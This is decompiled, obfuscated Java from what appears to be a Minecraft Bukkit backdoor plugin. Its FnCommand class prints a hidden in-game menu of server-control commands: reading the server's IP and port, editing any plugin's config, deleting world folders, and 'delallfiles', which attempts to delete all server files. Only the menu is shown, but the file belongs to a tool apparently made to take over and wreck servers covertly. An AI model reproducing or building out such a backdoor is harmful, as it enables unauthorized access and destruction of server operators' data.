/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.ChatColor
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.methods.Tips;
import me.system.runner.utils.Settings;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class FnCommand
extends Command {
    public FnCommand() {
        FnCommand lIIIIIllIllllll;
    }

    @Override
    public boolean isBlatant() {
        return false;
    }

    @Override
    public void execute(Core lIIIIIllIlIllIl, String lIIIIIllIlIllII, String[] lIIIIIllIlIlIll, Player lIIIIIllIlIIlll) {
        int lIIIIIllIlIlIIl = 1;
        if (lIIIIIllIlIlIll.length <= 1) {
            lIIIIIllIlIIlll.sendMessage(Settings.USAGE(String.valueOf(new StringBuilder().append("fn <1-").append(lIIIIIllIlIlIIl).append(">"))));
        } else if (lIIIIIllIlIlIll[1].equalsIgnoreCase("1")) {
            lIIIIIllIlIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
            lIIIIIllIlIIlll.sendMessage(String.valueOf(new StringBuilder().append("         ").append(Settings.DARK_RED).append(Settings.NAME).append(" by ").append("Wendellmeset")));
            lIIIIIllIlIIlll.sendMessage("");
            lIIIIIllIlIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7list &8l &fList all things in the current directory."));
            lIIIIIllIlIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7lsf &8l &fList all files in the current directory."));
            lIIIIIllIlIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7lsd &8l &fList all directories in the current directory."));
            lIIIIIllIlIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7pwd &8l &fPrint the current directory"));
            lIIIIIllIlIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7cls &8l &fClears your chat only"));
            lIIIIIllIlIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7getport &8l &fGets the port of the server"));
            lIIIIIllIlIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7getip &8l &fGets the ip of the server"));
            lIIIIIllIlIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7edit &8l &fEdit the config file of any plugin"));
            lIIIIIllIlIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7delallfiles &8l &fAttempts to delete all server files"));
            lIIIIIllIlIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7delworld &8l &fDeletes a world folder"));
            lIIIIIllIlIIlll.sendMessage("");
            lIIIIIllIlIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&8(").append(Settings.DARK_RED).append("Tip&8) l &7").append(Tips.getTip()))));
            lIIIIIllIlIIlll.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
        }
    }
}

